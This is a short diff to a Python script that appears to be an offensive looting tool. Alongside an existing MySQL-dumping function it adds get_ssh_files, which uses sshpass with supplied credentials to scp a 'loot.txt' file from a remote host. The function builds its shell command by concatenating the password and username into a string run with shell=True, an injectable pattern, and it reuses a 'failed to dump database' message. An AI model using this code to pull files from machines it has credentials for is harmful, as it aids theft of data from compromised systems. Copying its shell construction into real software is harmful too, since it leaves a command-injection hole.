@@ -56,6 +56,17 @@ def get_mysql_files(ip, username, password):
 	if err is not None:
 		print("\t\tfailed to dump database")
 
+def get_ssh_files(ip, username, password, filename=None):
+	mkdir = "cd ssh; "#mkdir " + username + ":" + ip + ";"
+	# make dump file
+	# touch = "touch " + username + ":" + ip + "/dump.sql;"
+	
+	cmd = mkdir + "sshpass -p \"" + password + "\" scp " + username + "@" + ip + ":~/loot.txt ./loot.txt;"
+	proc = subprocess.Popen(cmd, stdout=subprocess.PIPE, shell=True)
+	out, err = proc.communicate()
+	if err is not None:
+		print("\t\tfailed to dump database")
+
 def make_ftp_folder():
 	cmd = "mkdir ftp"
 	proc = subprocess.Popen(cmd, stdout=subprocess.PIPE, shell=True)
